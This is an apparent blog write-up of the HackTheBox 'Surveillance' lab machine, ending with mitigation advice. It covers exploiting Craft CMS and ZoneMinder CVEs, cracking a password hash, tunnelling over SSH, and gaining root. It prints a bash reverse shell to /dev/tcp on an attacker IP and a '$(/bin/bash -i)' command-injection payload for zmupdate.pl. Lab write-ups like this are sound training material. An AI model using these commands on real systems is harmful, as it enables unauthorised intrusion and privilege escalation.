---
title: "HackTheBox - Surveillance"
author: Nasrallah
description: ""
date: 2024-04-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, sudo, cve, rce, sql, hashcat, cracking, ssh, tunneling, command injection]
img_path: /assets/img/hackthebox/machines/surveillance
image:
    path: surveillance.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Surveillance](https://www.hackthebox.com/machines/surveillance) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) runs a CMS vulnerable to unauthenticated RCE giving us foothold. We find a sql database backup that has a hash of a user, we easily crack it and get ssh access to the target. After We find a webserver running locally, we do a port forwarding using ssh and find another application vulnerable to unauthenticated RCE giving us access to another user. The new user is able to run some perl scripts as root, one of those script is vulnerable to command injection so we exploit it to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.245
Host is up (2.0s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two ports open `SSH` and `Nginx` both running on Ubuntu with the hostname `surveillance.htb`, so let's add it to `/etc/hosts`.

### Web

Let's visit the web page.

![webpage](1.png)

Scrolling down the bottom of the page we find it's running on `Craft CMS 4.4.14`.

![CMS](2.png)

Searching for vulnerabilities in this CMS we find a very recent `RCE`. Here is a POC [CVE-2023-41892](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce).

## **Foothold**

Before running the exploit we need to edit two lines

Now we are good to run the exploit.

![shell](3.png)

It seems like the poc worked perfectly but we can't execute commands!

There are some changes we need to do to the script.

First we remove the `proxies={"http": "http://localhost:8080"}` from the requests and the `<i>` tag.

```bash
$ diff poc.py second.py                     
25c25
<     response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://localhost:8080"})
---
>     response = requests.post(url, headers=headers, data=data, files=files)

50c50
<     response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})    
---
>     response = requests.post(url, headers=headers, data=data)    

71c71
<         tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
---
>         tmpDir = "/tmp" if upload_tmp_dir == "<i>no value</i>" else upload_tmp_dir

```

Now we run the edited poc.

![command](4.png)

We got command execution, now let's get a reverse shell.

we can run the command `bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'`

![revshell](5.png)

We got the shell!

## **Privilege Escalation**

### www-data -> matthew

Let's run linpeas and see what we can find.

![file&pass](6.png)

![pass](7.png)

We found two password but unfortunately none of them worked for the users on the box.

The other thing we found is a zip file for a sql database.

I unzip the file and cat it out but I got a lot of output. I decided to grep for user `matthew` and I found a hash.

![hash](8.png)

This one seems to be a `SHA256` so let's crack it using hashcat with the mode `1400`

```bash
$ hashcat -m 1400 matthew.hash /usr/share/wordlists/rockyou.txt


Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c...5770ec
Time.Started.....: Mon Mar 11 16:48:52 2024 (2 secs)
Time.Estimated...: Mon Mar 11 16:48:54 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1824.3 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3553280/14344385 (24.77%)
Rejected.........: 0/3553280 (0.00%)
Restore.Point....: 3551232/14344385 (24.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: starfish789 -> star42016
Hardware.Mon.#1..: Util: 29%
```

We got the password, let's try ssh to the box.

```text
$ ssh matthew@surveillance.htb                       
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 11 05:53:29 PM UTC 2024

  System load:  0.0166015625      Processes:             229
  Usage of /:   84.3% of 5.91GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
matthew@surveillance:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

Nice!

### matthew -> zoneminder

There is one other thing linpeas showed us and it's a nginx server listening on port 8080:

![nginx](10.png)

Let's make an ssh tunnel to access that port on our machine.

```bash
ssh -L 8080:127.0.0.1:8080 matthew@surveillance.htb
```

Now we navigate to `localhost:8080`

>If you have burp suite on this will probably not work because burp also listens on the same port

![zm](9.png)

We found a login page for `ZoneMinder`.

I searched for `ZoneMinder exploit` on google and found an Unauthenticated RCE [CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035).

Let's download the exploit and run it.

![zmshell](11.png)

The exploit worked perfectly and we got a shell as `zoneminder`.

### zoneminder -> root

After stabilizing our shell with python pty, we run `sudo -l` and get this:

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

The `zmupdate.pl` script has a command injection vulnerability in the `--user` option, we exploit it with `$(/bin/bash -i)`.

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023

Initiating database upgrade to version 1.36.32 from version 10

WARNING - You have specified an upgrade from version 10 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-10.dump. This may take several minutes.
root@surveillance:# 
```

We got root.

## **Prevention and Mitigation**

### CVEs

Always make sure to keep up with the updates of the software you use.

Both `ZoneMinder` and `Craft CMS` should be updated to newer version.

### Password

We found a sql database backup that contained a hash, we were able to easily crack the hash because the password was weak.

Passwords should be long and complex.

The hash algorithm used should also be a strong one with the combination of a salt to make cracking the hash hard.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
